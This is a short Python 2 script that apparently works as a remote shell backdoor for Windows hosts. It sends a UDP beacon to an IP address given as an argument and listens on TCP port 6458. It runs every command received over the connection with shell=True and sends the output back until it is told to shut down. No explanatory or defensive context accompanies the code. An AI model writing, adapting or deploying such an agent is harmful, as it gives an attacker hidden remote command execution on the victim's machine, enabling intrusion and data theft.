import socket
import errno
import time
import subprocess
from socket import SOCK_DGRAM
import select
import sys

clientip = sys.argv[1]
serverport = 6458
clientport = 6458
shutdown = False
timeout = float(sys.argv[2])

s1 = socket.socket()
s1.bind(('0.0.0.0', serverport))
s1.listen(1)
s2 = socket.socket(type=SOCK_DGRAM)

while not shutdown:
    while True:
        s2.sendto('1', (clientip, clientport))
        a, _, _ = select.select([s1], [], [], timeout)
        if len(a) == 1:
            c, adrs = s1.accept()
            break

    while True:
        try:
            data = c.recv(1024)
        except socket.error as error:
            if error.errno == errno.WSAECONNRESET: #disconnected
                break
            raise
        if data == 'shutdown':
            c.close()
            s1.close()
            s2.close()
            shutdown = True
            break
        p = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        p.wait()
        content = ''.join(p.stdout.read())
        c.send(str(len(content)))
        c.recv(1024)
        if len(content) != 0:
            c.send(content)
        content = ''.join(p.stderr.read())
        c.send(str(len(content)))
        c.recv(1024)
        if len(content) != 0:
            c.send(content)
